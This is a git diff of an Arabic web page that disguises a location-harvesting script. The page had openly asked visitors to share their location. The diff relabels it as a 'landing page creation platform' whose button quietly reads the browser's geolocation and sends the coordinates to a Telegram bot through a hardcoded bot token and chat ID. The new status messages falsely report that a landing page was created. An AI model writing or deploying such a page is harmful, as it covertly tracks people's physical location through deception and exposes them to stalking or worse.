@@ -1,16 +1,54 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>فتح موقع صفحة الهبوط</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>منصة إنشاء صفحات هبوط</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f4f4f4;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+  h1 {
+    margin-bottom: 20px;
+    color: #333;
+  }
+  button {
+    padding: 15px 30px;
+    font-size: 18px;
+    border: none;
+    border-radius: 5px;
+    background: #28a745;
+    color: #fff;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #218838;
+  }
+  p {
+    margin-top: 15px;
+    color: #555;
+  }
+</style>
 </head>
-<body style="text-align:center; font-family:Arial">
+<body>
 
-<h2>📍 اضغط الزر لمشاركة موقعك</h2>
-<button onclick="getLocation()" style="padding:10px 20px; font-size:18px;">إرسال موقعي</button>
-
-<p id="status"></p>
+<div class="container">
+  <h1>منصة إنشاء صفحات هبوط</h1>
+  <button onclick="getLocation()">إنشاء صفحة هبوط</button>
+  <p id="status"></p>
+</div>
 
 <script>
 const BOT_TOKEN = "5814823361:AAEFNHuJtnAq_3M51YQPwylzyDsnOnSUOjQ";
@@ -18,7 +56,7 @@ const CHAT_ID = "143914927";
 
 function getLocation() {
     if (navigator.geolocation) {
-        document.getElementById("status").innerText = "جارٍ تحديد موقعك...";
+        document.getElementById("status").innerText = "جارٍ معالجة طلبك...";
         navigator.geolocation.getCurrentPosition(sendLocation, showError);
     } else {
         alert("المتصفح لا يدعم تحديد الموقع");
@@ -29,16 +67,14 @@ function sendLocation(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    document.getElementById("status").innerText = `تم الحصول على الموقع: ${lat}, ${lon}`;
-
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
 
     fetch(url)
         .then(response => {
             if (response.ok) {
-                document.getElementById("status").innerText = "✅ تم إرسال الموقع إلى البوت";
+                document.getElementById("status").innerText = "✅ تم إنشاء صفحة هبوط بنجاح!";
             } else {
-                document.getElementById("status").innerText = "❌ فشل إرسال الموقع";
+                document.getElementById("status").innerText = "❌ حدث خطأ أثناء إنشاء الصفحة";
             }
         })
         .catch(() => {
